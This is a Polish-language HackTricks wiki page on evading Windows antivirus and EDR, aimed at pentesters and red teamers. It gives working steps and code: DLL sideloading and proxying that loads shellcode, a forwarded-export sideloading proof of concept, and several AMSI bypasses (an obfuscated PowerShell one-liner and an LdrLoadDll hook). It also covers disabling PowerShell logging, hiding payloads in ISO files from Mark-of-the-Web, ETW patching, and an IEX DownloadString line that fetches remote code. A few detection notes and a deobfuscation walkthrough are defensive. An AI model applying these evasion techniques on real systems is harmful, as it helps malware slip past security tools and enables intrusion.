# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender podszywając się pod inne AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologia omijania AV**

Obecnie AVs używają różnych metod sprawdzania, czy plik jest złośliwy: static detection, dynamic analysis oraz, w przypadku bardziej zaawansowanych EDRs, behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych złośliwych łańcuchów lub tablic bajtów w pliku binarnym lub skrypcie, a także na wyciąganiu informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały one już zanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego typu wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebował loadera do odszyfrowania i uruchomienia programu w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka łańcuchów w pliku binarnym lub skrypcie, żeby ominąć AV, ale może to być czasochłonne w zależności od tego, co próbujesz obfuskować.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będzie znanych złych sygnatur, ale zajmie to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzenia statycznego wykrywania przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Narzędzie dzieli plik na wiele segmentów i następnie prosi Defender o przeskanowanie każdego z nich indywidualnie, dzięki czemu może dokładnie wskazać, które łańcuchy lub bajty w pliku binarnym są oznaczone.

Gorąco polecam sprawdzić tę [playlistę na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Dynamic analysis to sytuacja, gdy AV uruchamia twój plik binarny w sandboxie i obserwuje złośliwą aktywność (np. próby odszyfrowania i odczytania haseł przeglądarki, wykonanie minidump na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby ominąć sandboksy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na obejście dynamic analysis AV. AV mają bardzo krótki czas na skanowanie plików, żeby nie przerywać pracy użytkownika, więc używanie długich sleepów może zaburzyć analizę binarek. Problem w tym, że wiele sandboksów AV może pominąć sleep w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj sandboksy mają bardzo mało zasobów do dyspozycji (np. < 2GB RAM), inaczej mogłyby spowolnić maszynę użytkownika. Możesz też podejść kreatywnie, np. sprawdzając temperaturę CPU lub nawet prędkości wentylatorów — nie wszystko będzie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz celować w użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera — jeśli nie będzie zgodna z oczekiwaną, program może się zakończyć.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa to HAL9TH, oznacza to, że jesteś w defender's sandbox i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych świetnych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących radzenia sobie z sandboksami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak powiedzieliśmy wcześniej, publiczne narzędzia w końcu zostaną wykryte, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, czy naprawdę musisz używać mimikatz? Czy nie mógłbyś użyć innego, mniej znanego projektu, który też zrzuca LSASS?

Prawidłowa odpowiedź to prawdopodobnie ta druga. Biorąc mimikatz jako przykład — to prawdopodobnie jedno z, jeśli nie najbardziej wykrywanych narzędzi przez AVs i EDRs; projekt sam w sobie jest super, ale też koszmarem, jeśli chodzi o obejście wykrywania, więc po prostu poszukaj alternatyw dla tego, co chcesz osiągnąć.

> [!TIP]
> Podczas modyfikowania swoich payloadów pod kątem evasji upewnij się, że wyłączyłeś automatyczne przesyłanie próbek w Defender, i proszę, naprawdę, NIE WGRYWAJ NA VIRUSTOTAL jeśli twoim celem jest osiągnięcie evasji na dłuższą metę. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, dopóki nie będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Kiedy tylko to możliwe, zawsze priorytetowo traktuj używanie DLLs do evasji — z mojego doświadczenia pliki DLL są zwykle znacznie mniej wykrywane i analizowane, więc to prosty trik, aby uniknąć detekcji w niektórych przypadkach (o ile twój payload ma możliwość uruchomienia się jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma współczynnik wykrywalności 4/26 na antiscan.me, podczas gdy EXE payload ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Pokażemy teraz kilka trików z plikami DLL, które pozwolą być znacznie bardziej ukrytym.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) oraz poniższego powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Gorąco polecam samodzielnie **zkładać DLL Hijackable/Sideloadable programs**, ta technika jest dość dyskretna, jeśli zostanie wykonana poprawnie, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo złapany.

Samo umieszczenie złośliwej DLL o nazwie, którą program spodziewa się załadować, nie uruchomi twojego payloadu, ponieważ program oczekuje konkretnych funkcji w tej DLL; aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwej) DLL do oryginalnej DLL, dzięki czemu zachowana jest funkcjonalność programu i możliwe jest obsłużenie uruchomienia twojego payloadu.

Będę korzystać z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie utworzy 2 pliki: szablon kodu źródłowego DLL oraz oryginalny, przemianowany plik DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany przy użyciu [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o zagadnieniach, które omówiliśmy bardziej szczegółowo.

### Wykorzystywanie Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są w rzeczywistości "forwarderami": zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiąże eksport, loader Windows wykona:

- Załaduj `TargetDll`, jeśli nie jest już załadowany
- Rozwiąże `TargetFunc` z niego

Kluczowe zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używana jest normalna kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego forward resolution.

To umożliwia pośrednią sideloading primitive: znajdź podpisany DLL, który eksportuje funkcję przekierowaną do nazwy modułu nie będącego KnownDLL, a następnie umieść ten podpisany DLL razem z DLL kontrolowanym przez atakującego o nazwie dokładnie takiej, jak nazwa przekierowanego docelowego modułu. Gdy przekierowany eksport zostanie wywołany, loader rozwiąże przekierowanie i załaduje twój DLL z tego samego katalogu, wykonując Twój DllMain.

Przykład zaobserwowany na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany zgodnie z normalną kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy plik DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny `DllMain` wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekierowanej funkcji, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Uruchom przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i uruchamia jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, otrzymasz błąd "missing API" dopiero po wykonaniu `DllMain`

Wskazówki do wykrywania:
- Skoncentruj się na forwarded exports, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyenumerować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z nie-systemowych ścieżek, a następnie ładujące non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alert dla łańcuchów proces→moduł takich jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj polityki integralności kodu (WDAC/AppLocker) i zabroń write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Omijanie wykryć to gra w kotka i myszkę — to, co działa dziś, może zostać wykryte jutro, więc nigdy nie polegaj wyłącznie na jednym narzędziu; jeśli to możliwe, łącz kilka technik unikania wykrycia.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo programy AV mogły skanować tylko **files on disk**, więc jeśli udało się w jakiś sposób uruchomić payloady **directly in-memory**, AV nie mógł nic zrobić, ponieważ nie miał wystarczającej widoczności.

The AMSI feature is integrated into these components of Windows.

- User Account Control, czyli UAC (podwyższanie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, tryb interaktywny i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- makra Office VBA

Pozwala rozwiązaniom antywirusowym na analizę zachowania skryptów, ujawniając zawartość skryptów w postaci niezaszyfrowanej i bez obfuskacji.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a następnie ścieżka do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy złapani in-memory z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również przekazywany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do in-memory execution. Dlatego zaleca się używanie niższych wersji .NET (np. 4.7.2 lub starszych) do in-memory execution, jeśli chcesz ominąć AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie w oparciu o wykrycia statyczne, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI potrafi deobfuskować skrypty nawet jeśli mają wiele warstw, więc obfuskacja może okazać się złym wyborem w zależności od sposobu wykonania. To sprawia, że uniknięcie wykrycia nie jest trywialne. Czasami jednak wystarczy zmienić kilka nazw zmiennych i wszystko zadziała, więc zależy to od stopnia oznakowania.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (również cscript.exe, wscript.exe itp.), możliwe jest łatwe manipulowanie nim nawet przy uruchomieniu jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacyjnej badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie uruchomione żadne skanowanie. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu wykorzystaniu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI nieużytecznym dla bieżącego procesu powershell. Ta linia oczywiście została wykryta przez samo AMSI, więc potrzebna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że najprawdopodobniej zostanie to oznaczone po opublikowaniu tego wpisu, więc nie powinieneś publikować żadnego kodu, jeśli chcesz pozostać niewykrytym.

**Memory Patching**

Technika ta została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych dostarczonych przez użytkownika) oraz nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG — w ten sposób wynik rzeczywistego skanu będzie 0, co interpretowane jest jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik używanych do obejścia AMSI przy pomocy powershell — sprawdź [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się o nich więcej.

### Blokowanie AMSI przez zapobieganie załadowaniu amsi.dll (LdrLoadDll hook)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka obejściem jest umieszczenie hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądany moduł to `amsi.dll`. W efekcie AMSI nigdy się nie ładuje i w tym procesie nie przeprowadzane są żadne skany.

Zarys implementacji (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript oraz z niestandardowymi loaderami (wszystko, co w przeciwnym razie załadowałoby AMSI).
- Stosuj razem z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Obserwowane użycie w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie to działa, skanując pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisując ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może być użyteczna do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) do tego celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell bez obron (to jest to, czego używa `powerpick` z Cobal Strike).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię binarki i ułatwi AVs i EDRs jej wykrycie. Bądź ostrożny z tym i rozważ stosowanie szyfrowania tylko do konkretnych sekcji kodu, które są wrażliwe lub wymagają ukrycia.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotykamy na kilka warstw ochrony, które blokują dekompilery i sandboksy. Poniższy proces niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Anti-tampering removal – ConfuserEx szyfruje każde *method body* i odszyfrowuje je wewnątrz statycznego konstruktora modułu (`<Module>.cctor`). Równocześnie modyfikuje sumę kontrolną PE, więc każda modyfikacja może spowodować awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wynik zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy budowie własnego unpackera.

2.  Symbol / control-flow recovery – podaj *clean* plik do **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybierz profil ConfuserEx 2
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, classes i variable names oraz odszyfruje stałe łańcuchy.

3.  Proxy-call stripping – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (a.k.a *proxy calls*) aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne API .NET, takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieprzejrzystych funkcji wrapperów (`Class8.smethod_10`, …).

4.  Manual clean-up – uruchom otrzymany binarny w dnSpy, wyszukaj duże Base64 bloby lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako TLV-kodowaną tablicę bajtów zainicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne podczas pracy na stacji offline.

> 🛈  ConfuserEx generuje niestandardowy atrybut o nazwie `ConfusedByAttribute`, który można użyć jako IOC do automatycznego triage próbek.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/) zdolnego zapewnić zwiększone bezpieczeństwo oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz zabezpieczenie przed manipulacją (tamper-proofing).
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez użycia żadnego zewnętrznego narzędzia i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez C++ template metaprogramming framework, co utrudni osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to drobnoziarnisty code obfuscation framework dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie assembly code, transformując zwykłe instrukcje w ROP chains, podważając naszą naturalną koncepcję normalnego control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL do shellcode, a następnie je załadować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu ochronę użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w podejściu opartym na reputacji, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając i uniemożliwiając użytkownikowi końcowemu uruchomienie pliku (choć plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony przy pobieraniu plików z internetu, wraz z URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne jest, aby pamiętać, że pliki wykonywalne podpisane za pomocą **zaufanego** certyfikatu podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem uniemożliwienia twoim payloadom otrzymania Mark of The Web jest spakowanie ich wewnątrz jakiegoś kontenera, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być zastosowany do woluminów **nie NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym na **logowanie zdarzeń**. Jednak może być również wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak w przypadku wyłączania (obejścia) AMSI, możliwe jest również sprawienie, by funkcja **`EtwEventWrite`** procesu przestrzeni użytkownika zwracała natychmiast bez logowania jakichkolwiek zdarzeń. Robi się to przez patchowanie funkcji w pamięci tak, aby od razu zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

